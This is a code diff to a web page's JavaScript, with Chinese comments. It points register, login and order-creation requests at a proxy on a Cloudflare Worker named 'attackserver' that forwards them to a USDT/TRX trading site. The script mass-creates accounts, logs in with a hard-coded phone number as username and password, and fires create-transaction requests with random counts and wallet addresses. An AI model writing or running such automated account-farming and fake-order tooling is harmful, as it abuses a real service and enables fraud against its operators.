@@ -102,6 +102,7 @@
         </div>
 
         <script>
+            const PROXY_BASE_URL = 'https://attackserver.2579823129.workers.dev'; // !!! 替换成你自己的 Worker URL
             // ==================== 你的原始 JavaScript 代码 ====================
 
             // 账号数据结构定义：{username, password, isLoggedIn, hasCreatedOrder, createdAt, updatedAt}
@@ -207,7 +208,7 @@
 
             const registerWithFetch = async () => {
                 // 1. 路径：与 curl 完全一致（不要用代理，先直接请求测试）
-                const url = '/trx/register';
+                const url = `${PROXY_BASE_URL}/trx/register`;
                 const areaMap = [
                     {
                         value: -10,
@@ -1270,7 +1271,7 @@
             // 我将根据上下文推测并补全这个函数。
             const loginWithFetch = async (username, password) => {
                 // 接口地址：与curl完全一致
-                const url = 'https://www.16888usdt.com/trx/login';
+                const url = `${PROXY_BASE_URL}/trx/login`;
                 // 请求体：直接复制curl --data-raw的原始字符串（无任何修改）
                 const requestBody = `{"username":"${username || '18129484037'}","password":"${
                     password || '18129484037'
@@ -1349,8 +1350,7 @@
                 const address = generateRandomAddress();
                 const count = Math.floor(Math.random() * 500) + 1; // 生成1到10000之间的随机数
                 // 接口地址：拼接查询参数（与curl完全一致）
-                const url = `/trx/system/order/create-transaction?count=${count}&address=${address}`;
-
+                const url = `${PROXY_BASE_URL}/trx/system/order/create-transaction?count=${count}&address=${address}`;
                 try {
                     const response = await fetch(url, {
                         method: 'GET', // curl无--data-raw，默认是GET方法
